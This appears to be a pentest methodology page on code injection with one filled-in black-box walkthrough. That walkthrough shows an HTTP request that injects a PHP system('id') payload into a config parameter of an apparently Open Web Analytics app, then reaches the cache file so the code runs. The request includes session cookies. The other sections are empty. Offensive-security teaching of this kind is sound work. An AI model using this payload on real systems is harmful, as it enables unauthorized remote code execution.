# Code Injection

## Check List

## Methodology

### Black Box

#### Code Injection via Create Cache File

{% stepper %}
{% step %}
Interact with the target web application and observe that it generates client-side cache files to store application error messages
{% endstep %}

{% step %}
Identify a request sent from the client that includes user-controlled input within an array-based parameter (The important thing is that you have carefully considered who is also named `config`)

```http
POST /index.php?owa_do=base.optionsGeneral HTTP/1.1  
Host: analytics.[REDACTED].com  
User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0  
Connection: keep-alive  
Content-Length: 95  
Content-Type: application/x-www-form-urlencoded  
Cookie: owa_p=8aacef0fbef40d5f8d8121ec2cc19aff386329fb030ead140fdf26491bcc5; owa_u=admin;; owa-u=admin; owa_p=8aacef0fbef40d5f8d8121ec2cc19aff386329fb030ead140fdf26491bcc5  
Accept-Encoding: gzip, deflate, br  

owa_action=base.optionsUpdate&owa_nonce=45faa7aae1&owa_config[darkshhadow]=<?php system('id'); ?> <--
```
{% endstep %}

{% step %}
Send the modified request to the server and observe that the application fails to properly handle the malicious input and generates an error
{% endstep %}

{% step %}
Confirm that the generated error is stored inside a cache file created by the application
{% endstep %}

{% step %}
Access the generated cache file directly through the browser
{% endstep %}

{% step %}
Observe that the injected PHP payload is executed and the command output is written inside the cache file
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
